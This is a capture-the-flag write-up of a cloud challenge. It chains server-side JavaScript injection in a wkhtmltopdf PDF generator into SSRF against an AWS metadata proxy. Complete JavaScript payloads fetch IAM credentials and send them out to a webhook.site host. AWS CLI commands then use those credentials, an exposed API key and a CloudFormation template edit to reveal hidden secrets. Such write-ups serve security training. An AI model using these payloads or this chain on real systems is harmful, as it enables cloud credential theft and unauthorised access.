# Level 7: `Santa ClAWS`
**Flag:** `TISC{iMPURrf3C7_sSRFic473_Si73_4nd_c47_4S7r0PHiC_fL4w5}`

## TL;DR
- The application exposes a PDF generator (`/generate-flyer`) which accepts HTML/JS input that is executed during server-side PDF rendering (wkhtmltopdf). This allowed injection of JS that can perform LFI and SSRF. 
- Exploration of server files revealed an internal reverse-proxy to the AWS Instance Metadata Service (IMDS) and internal services. Interacting with the IMDS via the proxy and retrieving IAM credentials, I enumerated S3 buckets, Secrets Manager and listed EC2 instances, which revealed a part of the flag, an internal API key, and an internal EC2 server respetively. 
- The internal EC2 instance hosts another HTTP server which is also vulnerable to SSRF, access to IMDS and retrieving internal IAM credentials. The internal server also allows using the previously found API key to invoke an internal API Gateway, and finally manipulated a CloudFormation stack template (temporarily removing `NoEcho`) to recover the second part of the flag.

---

## 1. Initial observations
- The PDF generator runs `wkhtmltopdf` server-side and renders supplied HTML/JS. This implies server-side code executes network requests from the server context during pdf generation.  
- The challenge name hints at AWS/EC2; assume services like IMDS and internal EC2 instances may be accessible from the app host.

---

## 2. Vulnerability: server-side HTML/JS injection during PDF render
The flyer generation form at `/generate-flyer` takes user-supplied HTML/JS and passes it to `wkhtmltopdf` (v0.12.6). Because rendering occurs server-side, HTML `<script>` tags allow us to run arbitrary JS, allowing the server to fetch arbitrary URIs (LFI/SSRF).

---

## 3. Discovery: reverse proxy to IMDS
Direct SSRF to `http://169.254.169.254/` appeared blocked as the server would return internal server error or hang for a long time. Instead, enumeration of the filesystem revealed an environment variable with a non-standard port:

```
/etc/environment
REVERSE_PROXY_PORT=45198
````

Connecting to the reverse proxy:

```js
try {
    var webhook = "https://webhook.site/...";

    var t = new XMLHttpRequest();
    t.open("GET","http://127.0.0.1:45198/",false);
    t.send();
    var out = "STATUS: " + t.status + "\n\n" + t.responseText

    var p = new XMLHttpRequest();
    p.open("POST", webhook, true);
    p.setRequestHeader("Content-Type","text/plain;charset=UTF-8");
    p.send(out);

} catch(e){
    var p = new XMLHttpRequest();
    p.open("POST", webhook, true);
    p.setRequestHeader("Content-Type","text/plain;charset=UTF-8");
    p.send("ERROR: "+e.message);
}
```

The webhook received
```
STATUS: 401
```

Further inspection on typical IMDS endpoints like `PUT /latest/api/token` confirmed that this service was a reverse proxy exposing IMDSv2 endpoints on localhost:45198.

---

## 4. Retrieving IAM credentials via IMDSv2

IMDSv2 requires a token obtained via PUT to `/latest/api/token`. Using the proxy we can exfiltrate data from the IMDS:

```js
try {
    var webhook = "https://webhook.site/...";

    var t = new XMLHttpRequest();
    t.open("PUT","http://127.0.0.1:45198/latest/api/token",false);
    t.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds","21600");
    t.send();
    var token = t.status===200 ? t.responseText : '';

    var endpoints = [
        '/latest/meta-data/iam/security-credentials/'
    ];

    var out = "TOKEN: " + token + "\n\n";
    for(var i=0;i<endpoints.length;i++){
        var path = endpoints[i];
        try {
            var x = new XMLHttpRequest();
            x.open("GET","http://127.0.0.1:45198"+path,false);
            if(token) x.setRequestHeader("X-aws-ec2-metadata-token",token);
            x.send();
            out += "PATH: " + path + "\nSTATUS: " + x.status + "\nBODY:\n" + x.responseText + "\n\n";
        } catch(e){
            out += "PATH: " + path + "\nERROR: " + e.message + "\n\n";
        }
    }

    var p = new XMLHttpRequest();
    p.open("POST", webhook, true);
    p.setRequestHeader("Content-Type","text/plain;charset=UTF-8");
    p.send(out);

} catch(e){
    var p = new XMLHttpRequest();
    p.open("POST", webhook, true);
    p.setRequestHeader("Content-Type","text/plain;charset=UTF-8");
    p.send("ERROR: "+e.message);
}
```

Response listed `claws-ec2`. Fetching that path returned IAM credentials for the `claws-ec2` role. Also retrieved `/latest/user-data` which referenced an S3 bucket: `s3://claws-web-setup-bucket`.

---

## 5. Using the retrieved IAM credentials

Configured the `aws` CLI with the recovered credentials and listed the S3 bucket:

```bash
export AWS_ACCESS_KEY_ID=<ID>
export AWS_SECRET_ACCESS_KEY=<SECRET>
export AWS_SESSION_TOKEN=<TOKEN>

aws s3 ls s3://claws-web-setup-bucket
# shows app.zip and flag1.txt
aws s3 cp s3://claws-web-setup-bucket/flag1.txt .
cat flag1.txt
# TISC{iMPURrf3C7_sSRFic473_Si73_4nd
```

**Flag part 1:** `TISC{iMPURrf3C7_sSRFic473_Si73_4nd`

Downloaded `app.zip` (server source) for local inspection, nothing interesting found.

---

## 6. Privilege enumeration

Using a AWS privilege enumeration tool [pacu](https://github.com/RhinoSecurityLabs/pacu), more privileges were found:

* `ec2:DescribeInstances`
* `secretsmanager:ListSecrets`

Using `ec2.describe_instances()` we can discover an internal instance named `claws-internal` with private IP `172.31.69.11`. Using `secretsmanager.list_secrets()` we can discover a secret named `internal_web_api_key-t7au98` whose value was:

```
54ul3yrF4p3mc7S4dhf0yy0AY5GQWd15
```

---

## 7. SSRF to internal service (172.31.69.11)

The original SSRF via the PDF generator was used to access `172.31.69.11`. Observed endpoints:

* `GET /`: `index.html`
* `GET /public/index.js`: client JS that reads `apiKey` from the query string
* `GET /api/healthcheck?url=...`: server-side fetch of the provided `url`; returns `{ status: "up", content: "<text>" }`
* `GET /api/generate-stack?api_key=...`: forwards request to an API Gateway endpoint, setting header `x-api-key: api_key`, returns whatever the API Gateway returns

We could SSRF the healthcheck endpoint to make the internal server fetch arbitrary URLs, but it did not expose local files directly. However, the internal EC2 also had IMDS access, repeating the IMDS enumeration returned `internal-ec2` credentials and its user-data pointed to `s3://claws-internal-setup-bucket/internal.zip`, containing the server source.

---

## 8. Inspecting internal.zip and API Gateway

Downloaded `internal.zip` from the internal S3 (using internal-ec2 credentials) and inspected `server.js`. The file revealed the API Gateway endpoint:

```
https://8u7sima66a.execute-api.ap-southeast-1.amazonaws.com
```

We had earlier found the API key value in Secrets Manager (`internal_web_api_key-t7au98`), so we can call the API:

```bash
curl -s "https://8u7sima66a.execute-api.ap-southeast-1.amazonaws.com/dev/generate_stack" \
  -H "x-api-key: 54ul3yrF4p3mc7S4dhf0yy0AY5GQWd15"
# -> {"stackId":"arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-ff934a59/21e722b0-9137-11f0-b9b0-06333aa23993"}
```

The API response indicated a CloudFormation stack was being created.

---

## 9. Inspect CloudFormation

Using the `internal-ec2` IAM credentials obtained earlier to inspect CloudFormation stack:

```bash
aws cloudformation describe-stacks --stack-name pawxy-sandbox-ff934a59
aws cloudformation get-template --stack-name pawxy-sandbox-ff934a59
```

The template description was `"Flag part 2"`. The template had a parameter `flagpt2` with `NoEcho: true`, causing the parameter value to be redacted in `describe-stacks`.

---

## 10. Recovering the CloudFormation parameter

From some blind testing, I found out that the internal IAM credentials had permissions to update the CloudFormation stack. I updated the stack with a modified template that retains the `flagpt2` value but removes `NoEcho`, making it no longer hidden.

By modifying the template to remove NoEcho:
```yaml
AWSTemplateFormatVersion: '2010-09-09'
Description: >
  Flag part 2

Parameters:
  flagpt2:
    Type: String

Resources:
  AppDataStore:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Sub app-data-sandbox-bucket
```

```bash
aws cloudformation update-stack \
  --stack-name pawxy-sandbox-ff934a59 \
  --template-body file://modified-template.yaml \
  --parameters ParameterKey=flagpt2,UsePreviousValue=true \
  --disable-rollback
```

After the stack update, `describe-stacks` revealed the uncensored `flagpt2` parameter.

**Flag part 2:** `_c47_4S7r0PHiC_fL4w5}`